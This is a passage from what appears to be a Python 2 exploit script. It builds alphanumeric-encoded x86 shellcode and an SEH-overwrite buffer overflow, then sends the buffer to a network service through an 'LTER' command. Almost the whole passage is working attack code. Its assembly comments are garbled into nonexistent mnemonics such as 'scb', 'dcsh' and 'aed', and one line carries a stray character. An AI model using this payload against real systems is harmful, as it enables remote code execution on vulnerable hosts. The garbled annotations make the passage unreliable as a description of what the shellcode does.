shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x51\x61\x71\x46" ## add  eax, 0x46716151
shellcode += "\x05\x41\x61\x71\x45" ## add  eax, 0x45716141
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x37\x27\x56\x62" ## add  eax, 0x62562737
shellcode += "\x05\x36\x16\x45\x61" ## add  eax, 0x61451636
shellcode += "\x05\x35\x25\x46\x42" ## add  eax, 0x42462535
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x47\x65\x57\x43" ## add  eax, 0x43576547
shellcode += "\x05\x46\x64\x46\x43" ## add  eax, 0x43466446
shellcode += "\x05\x45\x44\x45\x42" ## add  eax, 0x42454445
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x36\x43\x37\x53" ## add  eax, 0x53374336
shellcode += "\x05\x35\x43\x26\x42" ## add  eax, 0x42264335
shellcode += "\x05\x24\x32\x25\x42" ## add  eax, 0x42253224
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x76\x63\x66\x13" ## add  eax, 0x13666376
shellcode += "\x05\x76\x52\x66\x14" ## add  eax, 0x14665276
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x21\x22\x71\x53" ## add  eax, 0x53712221
shellcode += "\x05\x20\x21\x70\x43" ## add  eax, 0x43702120
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x12\x25\x67\x17" ## add  eax, 0x17672512
shellcode += "\x05\x11\x25\x67\x06" ## add  eax, 0x06672511
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x24\x03\x75\x43" ## add  eax, 0x43750324
shellcode += "\x05\x24\x03\x65\x43" ## add  eax, 0x43650324
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x34\x26\x33\x35" ## add  eax, 0x35332634
shellcode += "\x05\x44\x26\x43\x34" ## add  eax, 0x34432644
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x24\x13\x76\x24" ## add  eax, 0x24761324
shellcode += "\x05\x24\x23\x66\x24" ## add  eax, 0x24662324
shellcode += "\x05\x23\x13\x54\x24" ## add  eax, 0x24541323
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x33\x57\x14\x04" ## add  eax, 0x04145733
shellcode += "\x05\x24\x47\x04\x04" ## add  eax, 0x04044724
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x11\x36\x61\x74" ## add  eax, 0x74613611
shellcode += "\x05\x22\x36\x51\x63" ## add  eax, 0x63513622
shellcode += "\x05\x11\x24\x61\x53" ## add  eax, 0x53612411
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x07\x02\x74\x17" ## add  eax, 0x17740207
shellcode += "\x05\x07\x01\x64\x07" ## add  eax, 0x07640107
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x61\x02\x21\x35" ## add  eax, 0x35210261
shellcode += "\x05\x61\x02\x10\x35" ## add  eax, 0x35100261
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235s
shellcode += "\x05\x65\x61\x31\x42" ## add  eax, 0x42316165
shellcode += "\x05\x64\x50\x21\x41" ## add  eax, 0x41215064
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x11\x72\x54\x22" ## add  eax, 0x22547211
shellcode += "\x05\x21\x62\x44\x22" ## add  eax, 0x22446221
shellcode += "\x05\x11\x52\x43\x22" ## add  eax, 0x22435211
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x45\x71\x67\x61" ## add  eax, 0x61677145
shellcode += "\x05\x44\x71\x56\x51" ## add  eax, 0x51567144
shellcode += "\x50"


buffer = espAdj3
buffer += shellcode
buffer += 'A' * (3427 - len(espAdj3) - len(shellcode))
buffer += espAdj2
buffer += longJump
buffer += 'A' * (3514 - 3427 - len(espAdj2) - len(longJump))
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += jump
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```
